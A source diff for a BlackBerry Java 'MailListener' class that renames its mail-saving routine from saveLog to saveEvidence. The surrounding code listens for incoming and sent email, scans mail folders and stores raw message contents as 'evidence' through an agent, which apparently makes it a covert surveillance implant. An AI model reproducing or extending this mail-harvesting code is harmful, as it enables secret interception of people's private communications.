@@ -30,9 +30,9 @@ import net.rim.device.api.util.IntHashtable;
 import blackberry.agent.MessageAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.EvidenceType;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
-import blackberry.log.LogType;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 
@@ -129,7 +129,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
             // realtime non guarda il lastcheck, li prende tutti.
             final int filtered = realtimeFilter.filterMessage(message, 0);
             if (filtered == Filter.FILTERED_OK) {
-                final boolean ret = saveLog(message,
+                final boolean ret = saveEvidence(message,
                         realtimeFilter.maxMessageSize, "local");
                 //#ifdef DEBUG
                 if (ret) {
@@ -230,7 +230,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
 
     }
 
-    protected synchronized boolean saveLog(final Message message,
+    protected synchronized boolean saveEvidence(final Message message,
             final int maxMessageSize, final String storeName) {
 
         //#ifdef DBC
@@ -239,7 +239,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("saveLog: " + message + " name: " + storeName);
+        debug.trace("saveEvidence: " + message + " name: " + storeName);
         //#endif
 
         try {
@@ -276,7 +276,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
             //#endif
 
             //#ifdef DEBUG
-            debug.trace("saveLog: "
+            debug.trace("saveEvidence: "
                     + mail.substring(0, Math.min(mail.length(), 200)));
             //#endif
 
@@ -293,15 +293,15 @@ public final class MailListener implements FolderListener, SendListener { //, St
             mailSaved.write(mail.getBytes("UTF-8"));
             //#endif
 
-            messageAgent.createLog(additionalData, mail.getBytes("UTF-8"),
-                    LogType.MAIL_RAW);
+            messageAgent.createEvidence(additionalData, mail.getBytes("UTF-8"),
+                    EvidenceType.MAIL_RAW);
 
             //messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
             //		LogType.MAIL_RAW);
 
         } catch (final Exception ex) {
             //#ifdef DEBUG
-            debug.error("saveLog message: " + ex);
+            debug.error("saveEvidence message: " + ex);
             //#endif
             return false;
 
@@ -406,7 +406,7 @@ public final class MailListener implements FolderListener, SendListener { //, St
                                     "scanFolders: storeName != null");
                             //#endif
 
-                            saveLog(message, collectFilter.maxMessageSize,
+                            saveEvidence(message, collectFilter.maxMessageSize,
                                     storeName);
 
                             break;
